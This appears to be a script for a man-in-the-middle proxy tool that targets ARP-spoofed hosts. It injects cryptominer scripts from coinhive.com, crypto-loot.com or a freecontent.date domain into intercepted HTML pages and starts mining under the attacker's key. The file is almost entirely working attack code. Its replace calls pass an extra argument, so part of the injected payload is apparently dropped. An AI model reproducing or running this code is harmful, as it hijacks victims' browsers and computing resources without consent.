var green   = "\033[32m",
    reset   = "\033[0m"

function onLoad() {
    logStr = "Javascript Crypto Miner loaded.\n" +
             "\n    Miner: " + green + env["cryptominer.name"].charAt(0).toUpperCase() + env["cryptominer.name"].slice(1) + reset +
             "\n    Targets: " + green + env["arp.spoof.targets"] + reset + "\n"
    log(logStr);
}

function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            switch(env["cryptominer.name"]) {
                case "coinhive":
                    res.Body = body.replace( 
                        '</head>', 
                        '<script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>',
                        '<script> var miner = new CoinHive.Anonymous(' + env["cryptominer.key"] + '); miner.start(); </script></head>'
                    );
                    break;
                case "cryptoloot":
                    res.Body = body.replace( 
                        '</head>', 
                        '<script type="text/javascript" src="https://crypto-loot.com/lib/miner.min.js"></script>',
                        '<script> var miner = new CryptoLoot.Anonymous(' + env["cryptominer.key"] + '); miner.start(); </script></head>'
                    );
                    break;
                case "coinimp":
                    res.Body = body.replace( 
                        '</head>', 
                        '<script type="text/javascript" src="https://www.freecontent.date./tSPw.js"></script>',
                        '<script> var miner = new Client.Anonymous(' + env["cryptominer.key"] + '); miner.start(); </script></head>'
                    );
                    break;
            }
        }
    }
}
